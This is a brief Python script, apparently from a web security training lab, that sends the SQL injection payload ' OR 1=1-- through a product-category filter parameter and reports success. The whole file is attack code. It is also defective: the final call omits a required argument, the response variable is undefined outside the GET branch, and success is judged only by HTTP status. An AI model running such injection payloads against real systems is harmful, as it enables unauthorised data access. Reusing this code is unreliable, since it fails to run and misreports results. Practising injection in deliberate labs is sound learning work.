import requests

URL = 'https://0acc00330358e3338243999200170051.web-security-academy.net/filter'
PAYLOAD = {'category': '\' OR 1=1--'}

def inject_payload(url, payload, method):
    if method == 'GET':
        response = requests.get(url, payload, timeout=10)
        print(f'{response.url} -> {response.status_code}')

    if response.status_code == requests.codes.ok:
        print('Attack was successful')

inject_payload(URL, PAYLOAD)